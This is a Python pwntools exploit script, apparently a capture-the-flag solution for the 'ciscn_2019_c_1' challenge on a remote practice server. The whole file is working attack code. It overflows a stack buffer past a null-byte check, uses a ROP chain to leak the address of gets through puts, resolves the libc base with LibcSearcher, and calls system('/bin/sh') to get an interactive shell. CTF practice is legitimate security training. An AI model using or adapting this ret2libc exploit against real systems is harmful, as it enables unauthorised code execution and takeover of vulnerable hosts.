from pwn import *
from LibcSearcher import *
context.log_level='debug'
p = remote('node3.buuoj.cn',27219)
#p = process('./ciscn_2019_c_1')
elf = ELF('./ciscn_2019_c_1')
puts_plt = elf.plt['puts']
gets_got = elf.got['gets']
main_addr = elf.sym['main']
pop_rdi_addr =0x0000000000400c83
ret_addr = 0x00000000004006b9
p.sendlineafter('choice!','1')
payload = '\0' + 'A'*0x4F + 'A'*0x08 +p64(pop_rdi_addr)+p64(gets_got)+p64(puts_plt)+p64(main_addr)
p.sendlineafter('encrypted',payload)
p.recvuntil('Ciphertext\n')
p.recvuntil('\n')
gets_addr = u64(p.recvline('\n')[:-1].ljust(8,'\0'))
libc = LibcSearcher('gets',gets_addr)
libc_base = gets_addr - libc.dump('gets')
sys_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
print hex(gets_addr),hex(sys_addr),hex(binsh_addr)
p.sendlineafter('choice!','1')
payload = '\0' + 'A'*0x4F + 'A'*0x08 +p64(ret_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(sys_addr)
p.sendlineafter('encrypted',payload)
p.interactive()